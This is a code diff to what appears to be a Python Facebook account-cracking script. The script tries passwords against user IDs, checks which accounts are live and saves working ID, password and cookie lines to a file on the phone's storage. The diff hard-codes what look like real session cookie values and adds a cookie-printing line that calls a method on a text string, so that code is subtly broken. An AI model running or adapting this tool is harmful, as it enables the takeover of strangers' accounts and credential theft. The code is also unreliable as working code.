@@ -1758,9 +1758,9 @@ def mbasic(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            fr_cookie_value = requests.get('https://touch.facebook.com').cookies.get('fr')
-            datr_cookie_value = requests.get('https://touch.facebook.com').cookies.get('datr')
             free_fb = Session.get('https://business.facebook.com/').text
+            koki = (";").join([ "%s=%s" % (key, value) for key, value in free_fb.cookies.get_dict().items() ])
+            print(f"{cyan}(ATOM-NV){koki}")
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1784,10 +1784,10 @@ def mbasic(uid,pwx,tl):
             'had_password_prefilled': 'false',
             'ab_test_data': re.search('name="ab_test_data" value="(.*?)"', str(free_fb)).group(1),
             'encpass':  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies ={
-            'fr': fr_cookie_value,
+            cookies =cookies = {
+            'fr': '0Ge9olQRX9wxG4dUG.AWUvGGn7H1RPi2vmf2cDQpkQKjY.BmQamB..AAA.0.0.BnAUGO.AWVuOIe2nps',
             'sb': 'galBZijJE3gDNJ8fh_fhANhG',
-            'datr': datr_cookie_value,
+            'datr': 'galBZo6ZvqtwWhtJgd_gsfBQ',
             'ps_n': '1',
             'ps_l': '1',
             'wd': '1440x402',
@@ -1821,7 +1821,7 @@ def mbasic(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
